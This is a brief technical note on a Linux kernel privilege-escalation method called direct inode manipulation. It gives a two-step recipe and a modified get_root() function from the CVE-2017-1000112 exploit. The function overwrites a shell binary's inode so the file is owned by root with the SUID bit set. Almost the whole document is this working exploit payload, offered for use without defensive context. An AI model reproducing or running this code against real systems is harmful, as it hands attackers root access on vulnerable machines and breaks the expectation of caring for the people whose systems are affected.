direct inode manipulation
=========================

The idea of direct inode manipulation is the following:
1) Create a shell binary
2) Exploit the vulnerability and change shell's inode (file) properties so it will be owned by root:root with SUID bit set

Here is the modified `get_root()` function of the original CVE-2017-1000112 exploit:

~~~
void get_root(void) {
	struct path path = { 0 };
	if (!user_path_at_empty(AT_FDCWD, SHELL, 0, &path, NULL)) {
		void *inode = (void *)(*(unsigned long *)(path.dentry + 48)); // dentry->d_inode
		*(unsigned short *)(inode + 0) = 0104755; // inode->i_mode
		*(unsigned   int *)(inode + 4) = 0; // inode->i_uid
		*(unsigned   int *)(inode + 8) = 0; // inode->i_gid
		path_put(&path);
	}
}
~~~
